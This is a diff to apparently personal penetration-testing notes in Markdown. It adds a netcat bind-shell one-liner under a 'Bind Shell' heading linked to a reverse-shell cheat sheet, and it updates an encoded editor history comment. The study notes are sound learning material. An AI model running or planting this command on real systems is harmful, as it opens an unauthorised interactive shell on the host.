@@ -87,11 +87,14 @@ Type of Shell | Method of Communication
 ## Bind Shell
 - we connect to the target on the listening port.
 - [Payload All The Things](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/) : Bind shell commands, example :
+	 ```bash
+	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
+	```
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbNzM2NzE5NTY5LC0xMTc5NzUxMjE1LC0xOT
-Y0OTQzODg4LDE0NjIxNTE5Myw2ODEzMzE3NDksOTIyMjQ1NTA3
-LDE0MTY1OTkwNzIsLTU3Mjg0ODA0MSwxNTM1MjM0OTYxLDQwOD
-QyODk4NSwtMTQ3NDIwMzYyOSwtMTAwMTM3MDA0MiwtMTU5Mzkw
-NDIzMiw2ODI3MDI2NTgsLTU3ODMyMTE5MCw4MTEwNjkwMTUsLT
-IwODg3NDY2MTJdfQ==
+eyJoaXN0b3J5IjpbMjEyNzkxNzU5NCwtMTE3OTc1MTIxNSwtMT
+k2NDk0Mzg4OCwxNDYyMTUxOTMsNjgxMzMxNzQ5LDkyMjI0NTUw
+NywxNDE2NTk5MDcyLC01NzI4NDgwNDEsMTUzNTIzNDk2MSw0MD
+g0Mjg5ODUsLTE0NzQyMDM2MjksLTEwMDEzNzAwNDIsLTE1OTM5
+MDQyMzIsNjgyNzAyNjU4LC01NzgzMjExOTAsODExMDY5MDE1LC
+0yMDg4NzQ2NjEyXX0=
 -->
